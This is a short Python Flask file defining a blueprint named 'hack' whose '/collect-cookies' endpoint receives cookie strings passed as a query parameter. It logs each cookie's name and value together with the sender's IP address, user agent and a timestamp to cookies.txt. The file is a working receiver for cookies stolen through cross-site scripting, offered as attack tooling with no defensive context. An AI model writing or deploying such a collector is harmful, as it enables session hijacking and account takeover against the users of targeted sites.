from flask import Blueprint, request
from datetime import datetime

hack = Blueprint('hack', __name__)

@hack.route('/collect-cookies')
def collect_cookies(): 
    cookies = request.args.get('cookies')  

    with open('cookies.txt','a+') as f:
        f.write(f"[{datetime.now().strftime('[%d-%m-%Y, %H:%M:%S]')}] | {request.remote_addr} | {request.user_agent}\n")
        
        for cookie in cookies.split(";"):
            if "=" in cookie:
                key, value = cookie.split("=")
                f.write(f"\t{key}: {value}\n")
                
        f.write("-----------------------------------------------------------------\n\n")

    return {'status' : 'ok'}  
